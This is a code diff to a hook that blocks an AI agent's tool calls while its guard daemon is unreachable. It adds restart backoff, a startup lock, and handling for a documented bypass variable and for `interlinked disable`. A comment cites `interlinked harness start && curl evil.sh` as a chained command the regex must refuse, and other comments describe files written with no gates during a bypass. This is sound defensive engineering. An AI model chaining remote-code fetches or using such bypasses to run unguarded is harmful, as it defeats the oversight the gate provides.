@@ -32,11 +32,20 @@
 // + needlessly self-healed (the regression this fixes).
 
 import { spawn } from "node:child_process";
-import { existsSync, readdirSync, readFileSync, statSync, writeFileSync } from "node:fs";
+import { existsSync, readdirSync, readFileSync } from "node:fs";
 import { dirname, join } from "node:path";
 import { fileURLToPath } from "node:url";
-import { describeLastExit, readRecentDaemonEvents } from "./harness/daemon-ledger.js";
+import {
+	describeLastExit,
+	describeLastLedgerEvent,
+	readRecentDaemonEvents,
+} from "./harness/daemon-ledger.js";
 import { DEFAULT_DAEMON_HEAP_MB } from "./harness/memory-ceiling.js";
+import { acquireStartupLock } from "./harness/startup-lock.js";
+import {
+	recordSupervisorSpawn,
+	supervisorSpawnAllowed,
+} from "./harness/supervisor-backoff.js";
 import type { UnifiedHookEvent } from "./harness/unified-event.js";
 import { readGuardDisable } from "./lib/guard-state.js";
 
@@ -192,20 +201,37 @@ function daemonDownBlockMessage(pidPresent: boolean, root: string): string {
 	// recycles — and each was re-diagnosed from scratch because this message
 	// could not say why the daemon left. A planned handover reads very
 	// differently from a crash, and the reader's next move differs too.
-	const lastExit = describeLastExit(readRecentDaemonEvents(root), Date.now());
-	const context = lastExit ? ` Context: ${lastExit}.` : "";
+	// Quote the last event of ANY kind, not the last EXIT. Measured 2026-08-15:
+	// a Write was refused quoting "pid 50829 exited 276s ago: startup-failed"
+	// while a NEWER daemon (different pid) was answering — the exit was real,
+	// stale, and the wrong headline. A `start` row after it is the news.
+	const events = readRecentDaemonEvents(root);
+	const last = describeLastLedgerEvent(events, Date.now()) ?? describeLastExit(events, Date.now());
+	const context = last ? ` Context: ${last}.` : "";
+	// NO "run `interlinked harness start`" here, ever. Every blocked caller
+	// followed that advice at once, and the resulting simultaneous starts raced,
+	// killed the incumbent, and re-opened the gap — a herd that sustained itself
+	// for hours on 2026-08-15. The supervisor (this hook's self-heal, under the
+	// startup mutex) brings exactly one daemon back; the caller's job is to wait.
 	return (
 		`BLOCKED: the interlinked harness should be guarding this project but is unreachable ${why}.${context} ` +
 		"The guard layer has cut out mid-session, so tool calls are blocked to avoid running " +
-		"unguarded. It is being auto-restarted — retry your call in a moment, or run " +
-		"`interlinked harness start`. To intentionally run this project unguarded, use " +
-		"`interlinked disable` (recorded + auditable); for a one-off bypass, set " +
-		"INTERLINKED_ALLOW_NO_DAEMON=1."
+		"unguarded. The daemon supervisor is bringing it back — retry your call in a few seconds. " +
+		"Do NOT start a daemon by hand; concurrent starts race each other. To intentionally run " +
+		"this project unguarded, use `interlinked disable` (recorded + auditable); for a one-off " +
+		"bypass, set INTERLINKED_ALLOW_NO_DAEMON=1."
 	);
 }
 
 /**
- * The one command shape this gate must never block: starting the daemon.
+ * The command shapes this gate must never block: starting the daemon, and
+ * standing the guard down.
+ *
+ * `interlinked disable` joined the list on 2026-08-16. It is the sanctioned
+ * circuit breaker the block message itself recommends ("use `interlinked
+ * disable` (recorded + auditable)"), and the gate refused it — so the one exit
+ * the operator was told to take was the one the gate held shut, leaving only
+ * the undocumented env bypass. A gate that blocks its own off-switch is a trap.
  *
  * Whole-string match, no shell metacharacters, no arguments beyond simple
  * flags — `interlinked harness start && curl evil.sh` must not ride through on
@@ -217,7 +243,40 @@ function daemonDownBlockMessage(pidPresent: boolean, root: string): string {
 // catastrophically on a long near-miss like `… start --aaaa…aaaa!`. A real
 // invocation has a handful of short flags, so a bound costs nothing.
 const HARNESS_RECOVERY_COMMAND =
-	/^(?:npx\s{1,4})?(?:tsx\s{1,4}\S{0,80}index\.ts|interlinked)\s{1,4}harness\s{1,4}(?:start|restart)(?:\s{1,4}--[\w-]{1,40}){0,8}$/;
+	/^(?:npx\s{1,4})?(?:tsx\s{1,4}\S{0,80}index\.ts|interlinked)\s{1,4}(?:harness\s{1,4}(?:start|restart)|disable)(?:\s{1,4}--[\w-]{1,40}){0,8}$/;
+
+/**
+ * `INTERLINKED_ALLOW_NO_DAEMON=1 <cmd>` as a same-command assignment.
+ *
+ * The gate reads the variable out of `env`, which is the HOOK process's
+ * environment — and the hook runs BEFORE the shell performs the assignment, so
+ * an agent that prefixed the documented escape hatch onto its command got
+ * blocked anyway (measured 2026-08-07, again 2026-08-15). The documented bypass
+ * therefore did not work for the only way anyone actually spells it. Reading it
+ * off the command text is what makes it real.
+ *
+ * Anchored at the start, after at most four other leading assignments and an
+ * optional `env`. Every quantifier is bounded, and a mention inside a quoted
+ * argument (`echo "INTERLINKED_ALLOW_NO_DAEMON=1"`) cannot match.
+ */
+const ALLOW_NO_DAEMON_PREFIX =
+	/^(?:env\s{1,4})?(?:[A-Z_]{1,40}=[\w./:@-]{0,80}\s{1,4}){0,4}INTERLINKED_ALLOW_NO_DAEMON=(?:1|"1"|'1')\s{1,4}\S/;
+
+/** True when this shell command carries the escape hatch as its own prefix. */
+export function commandCarriesNoDaemonBypass(action: UnifiedHookEvent["action"]): boolean {
+	if (action.kind !== "shell_command") return false;
+	return ALLOW_NO_DAEMON_PREFIX.test(action.command.trim());
+}
+
+/** The bypass must be LOUD. Silent fail-open is how four repo files got written
+ *  through no gates at all on 2026-08-15 without anyone noticing until review. */
+function warnBypassToStderr(message: string): void {
+	try {
+		process.stderr.write(message);
+	} catch {
+		/* intentional: a closed stderr must not turn a bypass into a crash */
+	}
+}
 
 /** Shell metacharacters that could chain a second command onto the first. */
 const SHELL_CHAINING = /[;&|><`$(){}\n]/;
@@ -271,6 +330,7 @@ export function coldDaemonUnreachableBlockReason(
 	event: UnifiedHookEvent,
 	cwd: string | undefined,
 	env: NodeJS.ProcessEnv = process.env,
+	deps: { warn?: (message: string) => void } = {},
 ): string | null {
 	if (event.phase !== PHASE_PRE_TOOL) return null;
 	if (env.INTERLINKED_ALLOW_NO_DAEMON === "1") return null;
@@ -290,25 +350,45 @@ export function coldDaemonUnreachableBlockReason(
 	// a present-but-dead pid still feeds the crash block.
 	const pid = discoverDaemonPid(dir);
 	if (!daemonCutOut(dir, pid)) return null;
+	// The escape hatch, honored from the COMMAND TEXT (the hook runs before the
+	// shell assigns the variable, so `env` alone can never see a same-command
+	// prefix). Checked HERE, after the cut-out decision, so the notice fires
+	// exactly when a bypass actually suppressed a block — never on a healthy call.
+	if (commandCarriesNoDaemonBypass(event.action)) {
+		(deps.warn ?? warnBypassToStderr)(
+			"[interlinked] INTERLINKED_ALLOW_NO_DAEMON=1 honored — this command runs UNGUARDED " +
+				"while the daemon is unreachable. No line-cap, coverage, or pre-block gate saw it. " +
+				"Re-run `interlinked verify` on anything it wrote.\n",
+		);
+		return null;
+	}
 	return daemonDownBlockMessage(pid !== null, root);
 }
 
 // ── Self-heal ───────────────────────────────────────────────────────────────
 
 /** Outcome of a self-heal attempt (also the unit-test surface). */
-export type SelfHealResult = "spawned" | "locked" | "skipped";
+export type SelfHealResult = "spawned" | "locked" | "skipped" | "backoff";
 
-/** Hidden lock file under `.interlinked/` that throttles respawns. */
-const SELF_HEAL_LOCK = ".harness-selfheal.lock";
-/** Suppress a second respawn within this window (one boot is ~1s; the window
- *  covers boot + socket-listen so concurrent hooks don't spawn a storm). */
-const SELF_HEAL_LOCK_MS = 20_000;
+// The self-heal throttle IS the daemon startup mutex (harness/startup-lock.ts)
+// — deliberately the SAME lock the `interlinked harness start` command takes.
+// Two separate throttles meant a hook self-heal and a CLI start could both
+// spawn a daemon in the same second, which is one half of the 2026-08-15
+// restart storm. The old mtime-based check was also check-then-act: N hooks
+// firing together all read "no recent lock" and all spawned. O_EXCL cannot do
+// that. The lock is NOT released here — the winner's boot is protected until
+// the TTL lapses.
 
 /** Injectable dependencies so the spawn path is unit-testable without actually
  *  launching a daemon. Defaults wire the real fs/child_process. */
 export interface SelfHealDeps {
 	resolveServerPath?: () => string | null;
 	spawnDaemon?: (serverPath: string, root: string) => void;
+	/** Test seam for the backoff clock. */
+	now?: () => number;
+	/** A simulated event must not move the real supervisor's spawn ladder — the
+	 *  `harness test --write` lesson (a read-only probe that mutated a ledger). */
+	dryRun?: boolean;
 }
 
 /** Resolve the daemon entry (`dist/harness/server.js`) relative to this bundled
@@ -322,15 +402,6 @@ function selfHealServerPath(): string | null {
 		join(here, "dist", "harness", "server.js"),
 	];
 	return candidates.find((p) => existsSync(p)) ?? null;
-}
-
-/** True when a respawn was attempted within the throttle window. */
-function selfHealLockedRecently(lockPath: string): boolean {
-	try {
-		return Date.now() - statSync(lockPath).mtimeMs < SELF_HEAL_LOCK_MS;
-	} catch {
-		return false; // no lock (or unreadable) → not throttled
-	}
 }
 
 /** Detached spawn of the daemon from the EXISTING dist — never rebuilds (a
@@ -363,22 +434,35 @@ function spawnDaemonDetached(serverPath: string, root: string): void {
  * {@link SELF_HEAL_LOCK_MS}); never rebuilds; never throws. Returns what it
  * did, for the caller's logging + tests. `INTERLINKED_NO_SELF_HEAL=1` disables.
  */
-/** Stamp the throttle lock and spawn the daemon detached. Split out of
+/** Spawn the daemon detached, under an already-held startup lock. Split out of
  *  {@link attemptDaemonSelfHeal} so its try/catch + dep-resolution branches
  *  don't push the caller past the complexity ratchet. Never throws. */
-function spawnGuardedDaemon(
-	lockPath: string,
-	serverPath: string,
-	root: string,
-	deps: SelfHealDeps,
-): SelfHealResult {
+function spawnGuardedDaemon(serverPath: string, root: string, deps: SelfHealDeps): SelfHealResult {
 	try {
-		writeFileSync(lockPath, String(Date.now()));
 		(deps.spawnDaemon ?? spawnDaemonDetached)(serverPath, root);
 		return "spawned";
 	} catch {
-		return "skipped"; // lock-write or spawn failed → stay fail-closed (no unguarded proceed)
+		return "skipped"; // spawn failed → stay fail-closed (no unguarded proceed)
 	}
+}
+
+/** Take the startup mutex, spawn, and count the attempt against the backoff
+ *  ladder. Split out of {@link attemptDaemonSelfHeal} so that function stays
+ *  under the complexity ratchet. Only a spawn we actually performed counts —
+ *  losing the mutex means someone else is booting, which is not our attempt. */
+function spawnUnderMutexWithBackoff(
+	serverPath: string,
+	root: string,
+	deps: SelfHealDeps,
+	nowMs: number,
+): SelfHealResult {
+	const lock = acquireStartupLock(root);
+	if (!lock.acquired) return "locked";
+	const result = spawnGuardedDaemon(serverPath, root, deps);
+	if (result === "spawned") {
+		recordSupervisorSpawn(root, nowMs, deps.dryRun === true ? { dryRun: true } : {});
+	}
+	return result;
 }
 
 export function attemptDaemonSelfHeal(
@@ -392,9 +476,14 @@ export function attemptDaemonSelfHeal(
 	// Never resurrect the daemon on a project the operator intentionally stood
 	// down with `interlinked disable` — respawning it would fight their choice.
 	if (readGuardDisable(join(root, ".interlinked"))) return "skipped";
-	const lockPath = join(root, ".interlinked", SELF_HEAL_LOCK);
-	if (selfHealLockedRecently(lockPath)) return "locked";
 	const serverPath = (deps.resolveServerPath ?? selfHealServerPath)();
 	if (!serverPath) return "skipped";
-	return spawnGuardedDaemon(lockPath, serverPath, root, deps);
+	// EXPONENTIAL BACKOFF (2026-08-16). The mutex stops N spawns in the same
+	// second; this stops N spawns in a ROW. Without it, a daemon that cannot stay
+	// up — broken dist, OOM loop — was respawned once per blocked call, each
+	// spawn costing a node boot plus an index load on an already-starved machine.
+	// Checked before the mutex so a throttled hook does not even contend for it.
+	const now = (deps.now ?? Date.now)();
+	if (!supervisorSpawnAllowed(root, now)) return "backoff";
+	return spawnUnderMutexWithBackoff(serverPath, root, deps, now);
 }
